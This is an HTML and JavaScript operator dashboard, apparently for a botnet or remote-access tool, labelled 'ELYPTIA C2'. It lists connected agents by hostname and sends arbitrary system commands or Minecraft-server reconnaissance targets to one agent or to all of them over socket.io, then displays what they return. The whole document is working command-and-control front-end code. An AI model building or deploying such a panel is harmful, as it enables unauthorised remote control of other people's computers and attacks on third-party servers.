<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELYPTIA | ULTRON COMMAND CENTER</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet" />
    <style>
        :root {
            --bg: #050505;
            --accent: #00f2ff;
            --border: rgba(0, 242, 255, 0.2);
            --glass: rgba(20, 20, 20, 0.8);
            --text: #e0e0e0;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'JetBrains+Mono', monospace;
            height: 100vh;
            overflow: hidden;
        }

        .grid {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px);
            background-size: 50px 50px; transform: rotateX(60deg) translateY(-200px);
            opacity: 0.1; z-index: -1;
        }

        .app-container {
            display: grid; grid-template-columns: 320px 1fr;
            height: 100vh; padding: 20px; gap: 20px;
        }

        /* Sidebar */
        .sidebar {
            background: var(--glass);
            border: 1px solid var(--border);
            border-radius: 12px; padding: 20px;
            display: flex; flex-direction: column; gap: 15px;
            overflow-y: auto;
        }

        .agent-card {
            background: rgba(255,255,255,0.05); padding: 12px;
            border-radius: 8px; cursor: pointer; border: 1px solid transparent;
            transition: 0.3s;
        }
        .agent-card.active { border-color: var(--accent); background: rgba(0, 242, 255, 0.1); }

        /* Main View */
        .main-content { display: grid; grid-template-rows: auto 1fr auto; gap: 20px; }

        .terminal-container {
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid var(--border);
            border-radius: 12px; display: flex; flex-direction: column; overflow: hidden;
        }

        .terminal-header {
            background: rgba(0, 242, 255, 0.1); padding: 10px 15px;
            font-size: 11px; border-bottom: 1px solid var(--border);
            display: flex; justify-content: space-between;
        }

        #terminal-output {
            flex: 1; padding: 15px; overflow-y: auto;
            font-size: 13px; line-height: 1.5;
        }

        .response-block {
            margin-bottom: 20px; padding: 12px;
            background: rgba(255, 255, 255, 0.03);
            border-left: 3px solid var(--accent);
            white-space: pre-wrap;
        }

        /* Input Zone */
        .input-bar {
            display: flex; gap: 15px; background: var(--glass);
            padding: 15px; border: 1px solid var(--border); border-radius: 12px;
        }

        input {
            flex: 1; background: transparent; border: none;
            color: var(--accent); font-family: inherit; font-size: 14px; outline: none;
        }

        button {
            background: var(--accent); color: #000; border: none;
            padding: 8px 20px; border-radius: 4px; font-weight: bold;
            cursor: pointer; font-family: 'Orbitron', sans-serif;
        }

        .player-entry { display: flex; align-items: center; margin: 5px 0; }
        .player-head { width: 24px; height: 24px; margin-right: 10px; border: 1px solid var(--accent); }
    </style>
</head>
<body>
    <div class="grid"></div>
    <div class="app-container">
        <div class="sidebar">
            <h1 style="font-family: 'Orbitron'; font-size: 18px; color: var(--accent); text-align: center;">ELYPTIA C2</h1>
            <div id="agent-list"></div>
        </div>

        <div class="main-content">
            <div style="background: var(--glass); padding: 15px; border-radius: 12px; border: 1px solid var(--border); display: flex; justify-content: space-between;">
                <div>STATUS: <span style="color: #00ff88;">ONLINE</span></div>
                <div id="active-target">TARGET: ALL</div>
            </div>

            <div class="terminal-container">
                <div class="terminal-header">
                    <span>TERMINAL_RECON_V5</span>
                    <span id="conn-status">CONNECTED</span>
                </div>
                <div id="terminal-output">
                    <div class="response-block" style="border-color: #555;">> En attente d'une cible... Entrez une IP Minecraft ou une commande système.</div>
                </div>
            </div>

            <div class="input-bar">
                <input type="text" id="cmd-input" placeholder="IP Cible (ex: 82.64.x.x) ou commande système..." autocomplete="off">
                <button id="send-btn">EXECUTE</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedAgent = 'all';

        function addLog(msg, color = "#e0e0e0") {
            const out = document.getElementById('terminal-output');
            const div = document.createElement('div');
            div.className = 'response-block';
            
            // Auto-formatage des joueurs avec tête
            let html = msg.replace(/├─ ● (.*?) \((.*?)\)/g, (m, name, uuid) => {
                return `<div class="player-entry"><img src="https://minotar.net/avatar/${name}/24" class="player-head"><b>${name}</b> <span style="opacity:0.4; font-size:10px;">[${uuid}]</span></div>`;
            });
            
            div.innerHTML = html;
            out.appendChild(div);
            out.scrollTop = out.scrollHeight;
        }

        socket.on('update_dashboard', (agents) => {
            const list = document.getElementById('agent-list');
            list.innerHTML = '';
            for (const id in agents) {
                const div = document.createElement('div');
                div.className = `agent-card ${selectedAgent === id ? 'active' : ''}`;
                div.onclick = () => {
                    selectedAgent = id;
                    document.getElementById('active-target').innerText = "TARGET: " + id;
                    document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('active'));
                    div.classList.add('active');
                };
                div.innerHTML = `<b>${id}</b><br><span style="font-size:10px; opacity:0.6;">${agents[id].hostname}</span>`;
                list.appendChild(div);
            }
        });

        socket.on('display_response', (data) => {
            addLog(`[${data.time}] REPONSE DE ${data.id}:\n${data.output}`);
        });

        function doSend() {
            const input = document.getElementById('cmd-input');
            const val = input.value.trim();
            if (!val) return;

            socket.emit('dispatch_command', {
                target: selectedAgent,
                command: val
            });
            
            addLog(`> Envoi vers ${selectedAgent} : ${val}`, "#555");
            input.value = '';
        }

        // CORRECTIF ANTI-REFRESH
        document.getElementById('send-btn').addEventListener('click', (e) => {
            e.preventDefault();
            doSend();
        });

        document.getElementById('cmd-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                doSend();
            }
        });

        socket.on('disconnect', () => {
            document.getElementById('conn-status').innerText = "DISCONNECTED";
            document.getElementById('conn-status').style.color = "red";
        });

        socket.on('connect', () => {
            document.getElementById('conn-status').innerText = "CONNECTED";
            document.getElementById('conn-status').style.color = "var(--accent)";
        });
    </script>
</body>
</html>
